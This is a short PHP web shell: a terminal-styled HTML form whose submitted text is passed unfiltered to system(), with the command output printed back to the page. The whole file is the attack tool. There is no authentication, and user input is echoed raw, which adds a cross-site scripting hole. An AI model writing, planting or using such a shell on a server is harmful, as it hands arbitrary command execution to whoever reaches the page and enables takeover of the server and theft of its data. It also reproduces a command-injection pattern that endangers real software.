<meta name="theme-color" content="black">
<style>
  body {
    background-color: black;
    color: #00ff1d;
    font-size: 50px;
    width: 100%;
  }
  label {
    color:#FF2400;
    font-size: 50px;
  }
  span {
    color:  #00ff1d;
  }
  input {
    border:none;
    outline:none;
    background: none;
    color: white;
    font-size: 50px;
    height: 70px;
    width: 50%;
  }
  .send {
    color:black;
    width: 70px;
  }
</style>

<FORM action="<? echo $_SERVER['PHP_SELF']; ?>" method="POST">
  <label>command here --> <span> $</span></label>
  <input type="text" name="text" required>
  <input class="send" type="submit" name="send" value="run">
</FORM>
<?php
if (isset($_POST['send'])):
  echo $_POST["text"] . "\n";
echo "<pre>";
system ($_POST['text']);
echo "</pre>";
    echo '<FORM action=" ' . $_SERVER['PHP_SELF'] . '" method="POST">
  <label>command here --> <span> $</span></label>
  <input type="text" name="text" required>
  <input class="send" type="submit" name="send" value="run">
</FORM>';
      
    //if ($_POST['text'])
endif;

